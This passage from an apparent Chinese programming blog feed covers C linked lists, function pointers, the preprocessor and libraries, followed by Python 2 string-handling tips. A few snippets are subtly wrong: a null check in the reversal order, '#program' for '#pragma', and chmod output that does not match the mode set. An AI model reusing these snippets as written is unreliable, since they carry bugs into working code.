0;&#125;</code></pre><p><strong>9.链表的逆序操作</strong></p><p>1.链表的逆置也是一个节点一个节点的逆置<br>2.逆置的起点不应该在链表的末尾，因为链表是单项的，如果你从末尾开始逆置为了得到前一项的位置，必须要不断的溯源，一直到链表的开始。<br>3.从前往后逆置，我们还是要知道链表是单项的，为了防止指针逆置以后把后面的值丢掉我们必须创建一个辅助指针变量保存下一个节点的地址<br>4.我们和以前一样依然需要两个辅助的指针变量，这样看来我们就需要三个辅助指针变量</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Node&#123;    int data;    struct Node* next;&#125;SLIST;//创建链表SLIST* createList()&#123;    int data =0;    SLIST* pHead;    SLIST* pCur;    SLIST* pM;    pHead = (SLIST*)malloc(sizeof(SLIST));    pCur = pHead;    if(pHead == NULL)&#123;        return NULL;    &#125;    pHead-&gt;data = 0;    pHead-&gt;next = NULL;    printf(&quot;\nplease enter your data:&quot;);    scanf(&quot;%d&quot;,&amp;data);    while(data != -1)&#123;        pM = (SLIST*)malloc(sizeof(SLIST));        if(pM == NULL)&#123;            return NULL;        &#125;        pM-&gt;data = 0;        pM-&gt;next = NULL;        pM-&gt;data = data;        pCur-&gt;next = pM;        pCur = pM;        printf(&quot;\nplease enter your data:&quot;);        scanf(&quot;%d&quot;,&amp;data);    &#125;    return pHead;&#125;//遍历链表int listPrint(SLIST* pHead)&#123;    SLIST* tmp = NULL;    if(pHead == NULL)&#123;        return -1;    &#125;    tmp = pHead-&gt;next;    printf(&quot;\nBegin\t\n&quot;);    while(tmp != NULL)&#123;        printf(&quot;%d\n&quot;,tmp-&gt;data);        tmp = tmp-&gt;next;    &#125;    printf(&quot;End\t\n&quot;);    return 0;&#125;//插入节点int nodeInsert(SLIST* pHead, int x ,int y )&#123;    SLIST* pM,*pCur,*pPre;    pPre = pHead;    pCur = pPre-&gt;next;    pM = (SLIST*)malloc(sizeof(SLIST));    if(pM == NULL)&#123;        return -1;    &#125;    pM-&gt;next = NULL;    pM-&gt;data = y;    while(pCur)&#123;        if(pCur-&gt;data == x)&#123;            pM-&gt;next = pCur;            pPre-&gt;next = pM;            break;        &#125;        pPre = pCur;        pCur = pCur-&gt;next;    &#125;    return 0;&#125;//删除节点int nodeDel(SLIST* pHead , int y)&#123;    SLIST* pM,*pCur,*pPre;    pPre = pHead;    pCur = pPre-&gt;next;    while(pCur)&#123;        if(pCur-&gt;data == y)&#123;            pPre-&gt;next = pCur-&gt;next;            break;        &#125;        pPre = pCur;        pCur = pCur-&gt;next;    &#125;    if(pCur == NULL)&#123;        printf(&quot;don&#39;t find the %d node ,please check and try again&quot;,y);        return -1;    &#125;    return 0;&#125;//链表逆置int listReverse(SLIST* pHead)&#123;    if(pHead == NULL || pHead-&gt;next-&gt;next == NULL || pHead-&gt;next ==NULL)&#123;        return -1;    &#125;    SLIST* pPer = pHead-&gt;next;    SLIST* pCur = pHead-&gt;next-&gt;next;    SLIST* tmp = NULL;    while(pCur)&#123;        tmp = pCur-&gt;next;        pCur-&gt;next = pPer;        pPer = pCur;        pCur = tmp;    &#125;    pHead-&gt;next-&gt;next = NULL;    pHead-&gt;next = pPer;    return 0;&#125;//链表销毁int listDistory(SLIST** p)&#123;    SLIST* tmp = *p;    if(NULL == p)&#123;        return -1;    &#125;    while(*p != NULL)&#123;        tmp = (*p)-&gt;next;        free(*p);        *p = tmp;    &#125;    return 0;&#125;int main() &#123;    int res = 0;    SLIST* pHead = NULL;    pHead = createList();    res = nodeInsert(pHead,20,19);    if(res != 0)&#123;        printf(&quot;func nodeInsert has something wrong please check and try again&quot;);        return res;    &#125;    res = listPrint(pHead);    if(res != 0)&#123;        printf(&quot;func listPrint has something wrong please check and try again&quot;);        return res;    &#125;    res = nodeDel(pHead,19);    if(res != 0)&#123;        printf(&quot;func listPrint has something wrong please check and try again&quot;);        return res;    &#125;    res = listPrint(pHead);    if(res != 0)&#123;        printf(&quot;func listPrint has something wrong please check and try again&quot;);        return res;    &#125;    res = listReverse(pHead);    if(res != 0)&#123;        printf(&quot;func listPrint has something wrong please check and try again&quot;);        return res;    &#125;    res = listPrint(pHead);    if(res != 0)&#123;        printf(&quot;func listPrint has something wrong please check and try again&quot;);        return res;    &#125;    res = listDistory(&amp;pHead);    if(res != 0)&#123;        printf(&quot;func listPrint has something wrong please check and try again&quot;);        return res;    &#125;    res = listPrint(pHead);    if(res != 0)&#123;        printf(&quot;func listPrint has something wrong please check and try again&quot;);        return res;    &#125;    return 0;&#125;</code></pre><p><strong>10.传统链表和非传统链表</strong></p><p><strong>传统链表的缺点：</strong><br>（1）和具体的结构绑定，不通用<br>（2）链表逻辑结构试图包含业务逻辑结构<br>（3）业务数据和链表逻辑的耦合性太高</p><p><strong>改进:</strong></p><p>于是我们对链表进行了改进，既然我们不能让链表包含万事万物，那我们干脆就不包含，我们让万事万物来包含我。</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Node&#123;//定义的一个单纯地链表节点    struct Node * next;&#125;Node;typedef struct Teacher&#123;//将这个链表节点植入一个结构体中    int age;    char name[64];    struct Node node; &#125;Teacher;int main() &#123;    printf(&quot;Hello, World!\n&quot;);    return 0;&#125;</code></pre><p>那么这样我们就能很快地构建一个静态链表</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Node&#123;    struct Node * next;&#125;Node;typedef struct Teacher&#123;    int age;    char name[64];    struct Node node;&#125;Teacher;int main() &#123;    Teacher t1,t2,t3;    t1.node.next = &amp;(t2.node);    t2.node.next = &amp;(t3.node);    t2.node.next = NULL;    return 0;&#125;</code></pre><p>那么假如我们只知道指针的地址，我们怎么得到节点中其他元素？回忆一下我们在讲结构体的时候讲过的，结构体中的每一个都有自己的相对偏移量，我们知道一个的偏移量就能求出其他元素的偏移量。</p><p><strong>改进：</strong></p><p>但是人总是很懒，每次都算偏移量真的很烦人，怎么办呢？我们想了一个办法，对这个链表进行改进。<br>我们如果把链表的指针域放在第一个那么是不是意味着我们每次指向下一个节点的时候我们其实也同时指向了这个指针域，这样我们就不用再算偏移量了。</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Node&#123;    struct Node * next;&#125;Node;typedef struct Teacher&#123;    struct Node node;    int age;    char name[64];&#125;Teacher;int main() &#123;    Teacher t1,t2,t3;    t1.node.next = &amp;(t2.node);    t2.node.next = &amp;(t3.node);    t2.node.next = NULL;    return 0;&#125;</code></pre><h2 id="0X13-函数指针"><a href="#0X13-函数指针" class="headerlink" title="0X13 函数指针"></a><strong>0X13 函数指针</strong></h2><h3 id="一、概念："><a href="#一、概念：" class="headerlink" title="一、概念："></a><strong>一、概念：</strong></h3><p>函数指针揭示了一个概念，就是：函数也是有地址的。我们可通过这个地址带来找到这个函数并对其进行操控。</p><h3 id="二、定义"><a href="#二、定义" class="headerlink" title="二、定义"></a><strong>二、定义</strong></h3><p>函数指针的定义我们要拿我之前说的数组指针的定义来类比学习，我们函数指针的类型是严格按照函数的返回类型定义的，我们函数指针的括号中有没有参数也是严格按照原函数是否有参数定义的。</p><p><strong>我们首先使用的是最简单的方法，就是直接声明一个函数指针</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;void test()&#123;    printf(&quot;hello world!&quot;);&#125;int main() &#123;    void (*p)() = NULL;    p = test;    p();    return 0;&#125;</code></pre><p>当然我们还可以将这个函数写的更复杂：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;void test()&#123;    printf(&quot;hello world!&quot;);&#125;int maxValue(int a , int b)&#123;    return a &gt; b? a : b ;&#125;int main() &#123;    int res = 0;    int (*p)(int,int) = NULL;    p = maxValue;    res =  p(19,20);    printf(&quot;%d\n&quot;,res);    return 0;&#125;</code></pre><p><strong>补充一下函数指针的另一种定义方法（依然是模仿数组的定义）：</strong></p><p><strong>1. 下面是先定义函数类型在定义函数指针的方法：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;void test()&#123;    printf(&quot;hello world!&quot;);&#125;int maxValue(int a , int b)&#123;    return a &gt; b? a : b ;&#125;int main() &#123;    int res = 0;    typedef int (func)(int,int);    func *p = maxValue;    res =  p(19,20);    printf(&quot;%d\n&quot;,res);&#125;</code></pre><p><strong>2. 下面是先定义函数指针类型再定义指针：</strong></p><p>先定义了函数的指针类型，然后用这个类型去定义一个指针，并且对指针赋值。</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;void test()&#123;    printf(&quot;hello world!&quot;);&#125;int maxValue(int a , int b)&#123;    return a &gt; b? a : b ;&#125;int main() &#123;    int res = 0;    typedef int(*point)(int,int);    point p = maxValue;    res =  p(19,20);    printf(&quot;%d\n&quot;,res);&#125;</code></pre><p><strong>定义函数指针数组：</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int func1()&#123;    printf(&quot;func1\n&quot;);&#125;int func2()&#123;    printf(&quot;func2\n&quot;);&#125;int func3()&#123;    printf(&quot;func3\n&quot;);&#125;int func4()&#123;    printf(&quot;func4\n&quot;);&#125;int main() &#123;    int res = 0;    int i = 0;    int(*parray[4])();    parray[0] = func1;    parray[1] = func2;    parray[2] = func3;    parray[3] = func4;    for(i=0;i&lt;4;i++)&#123;        parray[i]();    &#125;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">func1func2func3func4</code></pre><p><strong>区别：</strong></p><p><strong>函数指针和指针函数的区别：</strong></p><p>1.函数指针是指向函数的指针<br>2.指针函数是返回值为指针 </p><h3 id="三、函数指针做函数参数（回调函数）"><a href="#三、函数指针做函数参数（回调函数）" class="headerlink" title="三、函数指针做函数参数（回调函数）"></a><strong>三、函数指针做函数参数（回调函数）</strong></h3><p><strong>函数指针做函数参数的最佳实践就是回调函数，怎么理解回调函数呢？</strong></p><p>其实很简单，我们首先需要创建一个模具，这个模具有两个参数（以最简单的为例），其中有一个是函数指针参数，另一个是普通的指针参数。这个模具的作用就是将这个普通参数指向的变量作为参数传递给这个函数指针指向的函数。于是我们相当于提供了一个接口，传递什么就调用什么，而不用担心传递的是不是符合函数的要求（因为我们已经把适配的函数也传递进去了）那么我们传进去的这个函数就叫做回调函数。 </p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int callbackTest(int *a, int *b, int(*p)(int,int)) &#123;    return p(*a,*b);&#125;int addTest(int a , int b)&#123;    return a+b;&#125;int main() &#123;    int a = 10;    int b = 11;    int res = 0;    res = callbackTest(&amp;a,&amp;b,&amp;addTest);    printf(&quot;%d\n&quot;,res);    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">21</code></pre><h2 id="0X14-预处理"><a href="#0X14-预处理" class="headerlink" title="0X14 预处理"></a><strong>0X14 预处理</strong></h2><h3 id="一、基本概念："><a href="#一、基本概念：" class="headerlink" title="一、基本概念："></a><strong>一、基本概念：</strong></h3><p>C语言对源程序的处理顺序是： </p><p>1.预处理<br>2.编译<br>3.汇编<br>4.链接</p><p>预处理是程序代码进行编译以前由预处理器对程序源码进行的处理，整个过程不对程序源码的语法进行解析</p><h3 id="二、文件包含指令年策略："><a href="#二、文件包含指令年策略：" class="headerlink" title="二、文件包含指令年策略："></a><strong>二、文件包含指令年策略：</strong></h3><p><strong>1.原理：</strong><br>include 是文件包含指令，在预处理的过程中会将被包含的文件全部加载进主文件中</p><p> <strong>图示:</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%A2%84%E5%A4%84%E7%90%86include.png" alt="此处输入图片的描述"></p><p><strong>2.&lt;&gt; 和 “” 的区别</strong><br>(1) &lt;&gt; 意味着系统会直接在指定的目录下寻找头文件<br>(2) “” 系统会先在c文件的目录下寻找，没有找到才会去指定目录</p><h3 id="三、宏定义"><a href="#三、宏定义" class="headerlink" title="三、宏定义"></a><strong>三、宏定义</strong></h3><h4 id="1-普通宏定义："><a href="#1-普通宏定义：" class="headerlink" title="1.普通宏定义："></a><strong>1.普通宏定义：</strong></h4><p>如果我们经常用一个数值，我们为了方便就能直接将其定义为一个不变的变量</p><pre><code class="hljs">int const num = 100;</code></pre><p>但是这样做有一个缺陷，就是在不支持c99的编译器中我们还是不能直接在数组的定义中直接使用num ，因为名义上num 还是一个变量，而在c99中数组的定义中是不能出现变量的，于是我们还是要使用宏定义</p><pre><code class="hljs">#define NUM 100（注意这里没有分号）</code></pre><p>定义完成以后，在预处理的时候，编译器会将代码中所有的 NUM 都替换成 100 这个常量</p><p><strong>一些注意点：</strong></p><p>1.宏名一般都是大写，以便区分于变量<br>2.宏定义可以是常数或者是表达式<br>3.宏定义不做语法检测，只有在编译器解析到被宏展开的语句的时候才会报错<br>4.宏定义不是C语言，因此不需要结尾的分号<br>5.宏名的有效范围是从定义到本源文件结束<br>6.可以使用 #undef 终止宏定义的作用域<br>7.宏定义中可以引用已经定义过的宏名<br>8.宏定义不重视作用域，从宏定义开始的行到文件末尾都是宏的作用域，我们可以用 #undef 来卸载这个宏<br>9.宏定义是没有数据类型的</p><h4 id="2-宏函数定义："><a href="#2-宏函数定义：" class="headerlink" title="2.宏函数定义："></a><strong>2.宏函数定义：</strong></h4><pre><code class="hljs">#define SUM(x,y) ((x)+(y))</code></pre><p><strong>一些注意点：</strong></p><p>1.用括号括住每一个参数并括住函数的整体定义<br>2.宏名不能有空格，但是替换字符串可以有空格<br>3.大写字母表示宏的函数名</p><h3 id="四、条件编译"><a href="#四、条件编译" class="headerlink" title="四、条件编译"></a><strong>四、条件编译</strong></h3><h4 id="1-基本概念："><a href="#1-基本概念：" class="headerlink" title="1.基本概念："></a><strong>1.基本概念：</strong></h4><p>正常情况下，源程序中所有的行都对会参加编译，但是有时候希望对部分源程序只在特定的条件下编译，而在其他条件下不编译</p><h4 id="2-几种情况："><a href="#2-几种情况：" class="headerlink" title="2.几种情况："></a><strong>2.几种情况：</strong></h4><p><strong>(1)测试存在</strong></p><pre><code class="hljs">#ifdef  标识符    程度段1#else    程序段2#endif</code></pre><p><strong>(2)测试不存在</strong></p><pre><code class="hljs"># ifndef    程序段1#else     程序段2#endif</code></pre><p><strong>(3)根据表达式：</strong></p><pre><code class="hljs">#if 表达式    程序段1#else    程序段2#endif</code></pre><p>那这些有什么用呢？我们可以用它来防止头文件被重复包含</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#ifndef xxxx#define xxxx//宏定义//结构体//...#endif</code></pre><h4 id="3-特殊的宏"><a href="#3-特殊的宏" class="headerlink" title="3.特殊的宏"></a><strong>3.特殊的宏</strong></h4><p>C编译器给我们提供了几个特殊的宏，我们无需自己定义就能直接使用</p><p><code>__FILE__</code> 宏所在文件的文件名<br><code>__LINE__</code> 当前所在的行号<br><code>__DATE__</code> 代码编译的日期<br><code>__TIME__</code> 代码编译的时间</p><p>这个我们可以在报错的时候使用这种内定的宏，实现返回文件名以及出错行数</p><h2 id="0X15-库的封装和使用"><a href="#0X15-库的封装和使用" class="headerlink" title="0X15 库的封装和使用"></a><strong>0X15 库的封装和使用</strong></h2><h3 id="一、基本概念：-1"><a href="#一、基本概念：-1" class="headerlink" title="一、基本概念："></a><strong>一、基本概念：</strong></h3><p>库是已经写好的、成熟的、可复用的代码，在我们开发应用的过程中，我们经常会遇到一些公共代码需要反复使用，我们就可以将其编译为库文件</p><p>库可以看做是.o文件的集合，我们将这些文件进行打包压缩以后行程一个库文件</p><h3 id="二、实现静态库"><a href="#二、实现静态库" class="headerlink" title="二、实现静态库"></a><strong>二、实现静态库</strong></h3><p><strong>那我们怎么才能自己写一个静态库呢？</strong></p><p>我们新建一个项目，在头文件中写一个 .h 文件 在源文件中写一个 .c 文件 ，这两个文件的文件名要一样，.h 文件中只进行函数的声明，.c 中要包含.h文件并写上函数的实现，我们在项目的属性中选择静态库lib，然后重新生成项目，那么在与该目录同级的目录中就生成了一个 .lib  文件，我们再给别人用的时候除了要给Lib还要把.h 文件同时给他，因为没有.h对方也不知道你这个 lib 文件里面可用哪些函数</p><p><strong>(以上方法是针对VS 的，其他编译器可能有所不同)</strong></p><h3 id="三、静态库的优缺点"><a href="#三、静态库的优缺点" class="headerlink" title="三、静态库的优缺点"></a><strong>三、静态库的优缺点</strong></h3><p>1.静态库对函数库的链接是放在编译时期完成的，而静态库在程序的链接阶段就被完全复制到了程序中<br>2.程序运行时与库再无瓜葛，移植方便<br>3.但是浪费了空间和资源<br>4.后期的修改和维护比较困难</p><h3 id="四、动态库应运而生"><a href="#四、动态库应运而生" class="headerlink" title="四、动态库应运而生"></a><strong>四、动态库应运而生</strong></h3><p>只有在程序运行的时候才会去加载动态库中的部分函数，而不是像静态库一眼不管三七二十一全部加载。</p><p>动态库的基本创建方式和静态库一样，就是我们需要添加一个导出函数,在 .h 文件的函数声明以前写这个</p><pre><code class="hljs">__declspec(dllexport)</code></pre><p>然后我们就能在项目外使用这个函数了</p><p><strong>区别：</strong></p><p>静态库和动态库的lib 文件不同，动态库的lib 只存储着导出函数和一些变量的声明，具体实现在.dll文件中</p><p><strong>如何引用动态库？</strong></p><p>将我们生成的动态库 .dll .lib .h 放到C源程序的目录下<br>在C文件的头部添加这样一段话</p><pre><code class="hljs">#program comment(lib,&quot;./mydll.lib&quot;);</code></pre><p>程序的寻找过程是这样的，首先检查 lib 文件中的导出函数，然后去dll 中寻找实现。</p><h2 id="0X16-结语"><a href="#0X16-结语" class="headerlink" title="0X16 结语"></a><strong>0X16 结语</strong></h2><p>花了一段时间仔细的梳理了一下C语言的种种，推翻之前自己对C语言的肤浅认识，完善了自己的编程的知识体系，主要还是训练自己对指针的理解和运用，还谈论了一些C语言基于指针的高级话题，比如数组指针、 函数指针、回调函数等，可能篇幅有些长，但是代码都是我手撸的，图是我手画的，当然其中还夹杂着自己的一些理解，除了自己备忘以外，也希望能对和我有相同目的的人有所帮助。</p>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程 进阶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 实用编程技巧（字符串篇）</title>
    <link href="/2018/09/05/Python%20%E5%AE%9E%E7%94%A8%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%AF%87%EF%BC%89/"/>
    <url>/2018/09/05/Python%20%E5%AE%9E%E7%94%A8%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%AF%87%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="1-如何拆分含有多种分隔符的字符串"><a href="#1-如何拆分含有多种分隔符的字符串" class="headerlink" title="1.如何拆分含有多种分隔符的字符串"></a><strong>1.如何拆分含有多种分隔符的字符串</strong></h2><h3 id="1-我们首先考虑单一分隔符的情况："><a href="#1-我们首先考虑单一分隔符的情况：" class="headerlink" title="(1)我们首先考虑单一分隔符的情况："></a><strong>(1)我们首先考虑单一分隔符的情况：</strong></h3><p> s &#x3D; “10800       1   10800      10800  ?         197609 14:12:16 &#x2F;usr&#x2F;bin&#x2F;mintty”</p><p> 我们使用字符串的 split()方法</p><span id="more"></span><pre><code class="hljs">s = &quot;10800       1   10800      10800  ?         197609 14:12:16 /usr/bin/mintty&quot;print s.split()</code></pre><h3 id="2-多重分隔符"><a href="#2-多重分隔符" class="headerlink" title="(2)多重分隔符"></a><strong>(2)多重分隔符</strong></h3><p><strong>方法一：既然split() 这个函数每次只能匹配一个，那我们可以弄一个循环</strong></p><pre><code class="hljs">def mySplit(s,ds):    res = [s]    for d in ds:        t = []        map(lambda x:t.extend(x.split(d)),res)        res = t    return ts = &#39;asb,ksh|aw.mwdn/zxcm?xmcin&lt;zxc&#39;ds = &#39;,|./?&lt;&#39;print mySplit(s,ds)</code></pre><p>这种情况下如果出现连续的两个分隔符的话，结果就会多出一个空白，我们最好还加一个过滤</p><pre><code class="hljs">def mySplit(s,ds):    res = [s]    for d in ds:        t = []        map(lambda x:t.extend(x.split(d)),res)        res = t    return [x for x in t if x]s = &#39;asb,ksh|aw.mwdn/zxcm??xmcin&lt;zxc&#39;ds = &#39;,|./?&lt;&#39;print mySplit(s,ds)</code></pre><p><strong>方法二：使用 re.split() 正则匹配函数，一次性完成</strong></p><pre><code class="hljs">import res = &#39;asb,ksh|aw.mwdn/zxcm??xmcin&lt;zxc&#39;print re.split(r&#39;[,|./?&lt;]+&#39;,s)</code></pre><h2 id="2-如何判断字符串a以字符串b开头或者结尾"><a href="#2-如何判断字符串a以字符串b开头或者结尾" class="headerlink" title="2.如何判断字符串a以字符串b开头或者结尾"></a><strong>2.如何判断字符串a以字符串b开头或者结尾</strong></h2><p>使用字符串的 startwith 和 endwith </p><p>比如我们需要找出当前目录下的一以 java 、php 、log 结尾的文件，并去除一部分权限</p><pre><code class="hljs">import os,stats = [x for x in os.listdir(&#39;.&#39;) if x.endswith((&#39;log&#39;,&#39;java&#39;,&#39;php&#39;))]a = map(lambda i:oct(os.stat(i).st_mode),s)map(lambda i:os.chmod(i,stat.S_IXOTH),s)b = map(lambda i:oct(os.stat(i).st_mode),s)print aprint b</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">[&#39;0100666&#39;, &#39;0100666&#39;, &#39;0100666&#39;][&#39;0100444&#39;, &#39;0100444&#39;, &#39;0100444&#39;]</code></pre><h2 id="3-如何调整字符串中文本的格式"><a href="#3-如何调整字符串中文本的格式" class="headerlink" title="3.如何调整字符串中文本的格式"></a><strong>3.如何调整字符串中文本的格式</strong></h2><p>比如我们有这样的需求，将日志文件中的本来的年月日格式：2018-01-02 全部替换成 01&#x2F;02&#x2F;2018 这样的格式</p><p>我们使用正则表达式  re.sub()</p><pre><code class="hljs">import res = open(&quot;./test.log&quot;).read()print re.sub(&#39;(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)&#39;,r&#39;\2/\3/\1&#39;,s)</code></pre><h2 id="4-如何将一个小字符串拼接成一个大字符串"><a href="#4-如何将一个小字符串拼接成一个大字符串" class="headerlink" title="4.如何将一个小字符串拼接成一个大字符串"></a><strong>4.如何将一个小字符串拼接成一个大字符串</strong></h2><h3 id="方法一：使用-拼接两个字符串"><a href="#方法一：使用-拼接两个字符串" class="headerlink" title="方法一：使用 + 拼接两个字符串"></a><strong>方法一：使用 + 拼接两个字符串</strong></h3><pre><code class="hljs">str1 = &quot;111&quot;str2 = &quot;222&quot;print str1+str2</code></pre><p>这里说一下，其实这个+是字符串自带的方法，是 <code>__add__</code> 的重载，相当于执行了 </p><pre><code class="hljs">srr.__add__(str1,str2)</code></pre><p>如果字符串在一个列表中的话：</p><pre><code class="hljs">l = [&quot;zxc&quot;,&quot;zzzz&quot;,&quot;weqe&quot;,&quot;1231&quot;,&quot;&lt;&gt;&lt;&gt;&quot;,&quot;[][]&quot;]print reduce(lambda x,y:x+y,l)</code></pre><h3 id="方法二：使用join-方法"><a href="#方法二：使用join-方法" class="headerlink" title="方法二：使用join 方法"></a><strong>方法二：使用join 方法</strong></h3><p>join 能传入一个可迭代对象</p><pre><code class="hljs">l = [&quot;zxc&quot;,&quot;zzzz&quot;,&quot;weqe&quot;,&quot;1231&quot;,&quot;&lt;&gt;&lt;&gt;&quot;,&quot;[][]&quot;]print &quot;;&quot;.join(l)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">zxc;zzzz;weqe;1231;&lt;&gt;&lt;&gt;;[][]</code></pre><p><strong>注意：</strong></p><p>如果我们的列表里面不只有字符串还有数字类型怎么办？</p><p><strong>方法一：我们使用列表解析</strong></p><pre><code class="hljs">pl = [123,&quot;xxx&quot;,456,&quot;dasdafa&quot;]print &quot;&quot;.join([str(x) for x in pl])</code></pre><p>但是这种方法会产生一个新的列表，如果列表很长的胡话就会非常耗费资源，于是有了方法二</p><p><strong>方法二：使用生成器</strong></p><p>不加[]的列表解析语句会生成一个生成器</p><pre><code class="hljs">pl = [123,&quot;xxx&quot;,456,&quot;dasdafa&quot;]print &quot;&quot;.join(str(x) for x in pl)</code></pre><h2 id="5-如何对字符串进行了左右居中的对齐"><a href="#5-如何对字符串进行了左右居中的对齐" class="headerlink" title="5.如何对字符串进行了左右居中的对齐"></a><strong>5.如何对字符串进行了左右居中的对齐</strong></h2><h3 id="方法一：使用字符串的-str-ljust-str-rjust-str-center-方法"><a href="#方法一：使用字符串的-str-ljust-str-rjust-str-center-方法" class="headerlink" title="方法一：使用字符串的 str.ljust(),str.rjust(),str.center()方法"></a><strong>方法一：使用字符串的 str.ljust(),str.rjust(),str.center()方法</strong></h3><pre><code class="hljs">s = &quot;asd&quot;print s.ljust(20)print s.ljust(20,&quot;=&quot;)print s.center(20)print s.center(20,&quot;=&quot;)print s.rjust(20)print s.rjust(20,&quot;=&quot;)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">asdasd=================        asd========asd=========                 asd=================asd</code></pre><h3 id="方法二：使用内置的字符串格式化方法—-format"><a href="#方法二：使用内置的字符串格式化方法—-format" class="headerlink" title="方法二：使用内置的字符串格式化方法—-format"></a><strong>方法二：使用内置的字符串格式化方法—-format</strong></h3><pre><code class="hljs">s = &quot;asd&quot;print format(s,&quot;&lt;20&quot;)print format(s,&quot;&gt;20&quot;)print format(s,&quot;^20&quot;)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">asd                 asd        asd</code></pre><h2 id="6-去掉字符串中不需要的字符"><a href="#6-去掉字符串中不需要的字符" class="headerlink" title="6.去掉字符串中不需要的字符"></a><strong>6.去掉字符串中不需要的字符</strong></h2><p>举例几个可能的情况</p><ol><li>我们需要去掉字符串两边的空白符</li><li>我们需要将Windows 下的换行符\r\n，转换成 Linux 下的换行符 \n</li><li>我们需要去掉拼音中的音调</li></ol><h3 id="方法一：strip-、lstrip-、-rstrip"><a href="#方法一：strip-、lstrip-、-rstrip" class="headerlink" title="方法一：strip() 、lstrip() 、 rstrip()"></a><strong>方法一：strip() 、lstrip() 、 rstrip()</strong></h3><pre><code class="hljs">s = &quot;  dasda  asda  &quot;print s.strip()</code></pre><p>lstrip() 、 rstrip() 同理，我就不再举例</p><p>现在如果是 “—–asda  adadad+++++”这种字符串的话，我们依然能用 strip()</p><pre><code class="hljs">s = &quot;-----adada  asdada++++&quot;print s.strip(&quot;-+&quot;)</code></pre><h3 id="方法二：使用切片加-拼接-删除固定位置的字符"><a href="#方法二：使用切片加-拼接-删除固定位置的字符" class="headerlink" title="方法二：使用切片加 +(拼接)删除固定位置的字符"></a><strong>方法二：使用切片加 +(拼接)删除固定位置的字符</strong></h3><pre><code class="hljs">s = &quot;asdb:213&quot;print s[:4]+s[5:]</code></pre><h3 id="方法三：字符串的replace-或者-re-sub"><a href="#方法三：字符串的replace-或者-re-sub" class="headerlink" title="方法三：字符串的replace()或者 re.sub()"></a><strong>方法三：字符串的replace()或者 re.sub()</strong></h3><pre><code class="hljs">s = &quot;\tasd\t123\t789&quot;print s.replace(&quot;\t&quot;,&quot;&quot;)</code></pre><p>如果有多个需要替换的话建议使用正则表达式 re.sub()</p><pre><code class="hljs">import res = &quot;asd,asqw\tzxc|&quot;print re.sub(&#39;[,\t|]&#39;,&quot;&quot;,s)</code></pre><h3 id="方法四：字符串的translate-方法来替换多个字符"><a href="#方法四：字符串的translate-方法来替换多个字符" class="headerlink" title="方法四：字符串的translate 方法来替换多个字符"></a><strong>方法四：字符串的translate 方法来替换多个字符</strong></h3><p>先来介绍一下 translate</p><p>translate 是映射功能，可以根据映射表来将字符替换</p><p>首先创建一个映射表</p><pre><code class="hljs">import stringstring.maketrans(&#39;abcxyz&#39;,&#39;xyzabc&#39;)</code></pre><p>意思是将 abcxyz 映射为 xyzabc</p><p>然后就是根据映射表来操纵字符串</p><pre><code class="hljs">import stringstring.maketrans(&#39;abcxyz&#39;,&#39;xyzabc&#39;)s = &quot;abc9790907xyz&quot;print s.translate(string.maketrans(&#39;abcxyz&#39;,&#39;xyzabc&#39;))</code></pre><p>translate 除了能根据映射替换字符以外，当你第一个参数传递为 None 的时候，第二个参数可以传递逆向删除的字符的自负串</p><pre><code class="hljs">s = &quot;asd/afji,1231\tzzz\r\n&quot;print s.translate(None,&#39;,/\t\r\n&#39;)</code></pre><p><strong>补充：如何去除标点</strong></p><p>标点实际上是 unicode 的一个组合字符</p><p>s &#x3D; u’ni\u0301 ha\u030co,chi\u0304 fa\u0300n’</p><p>我们主要是利用 unicode 的 translate 方法,它传入一个字典</p><pre><code class="hljs">s = u&#39;ni\u0301 ha\u030co,chi\u0304 fa\u0300n&#39;print s.translate(dict.fromkeys([0x0301,0x030c,0x0304,0x0300]))</code></pre>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程 Python 进阶 备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 实用编程技巧（迭代篇）</title>
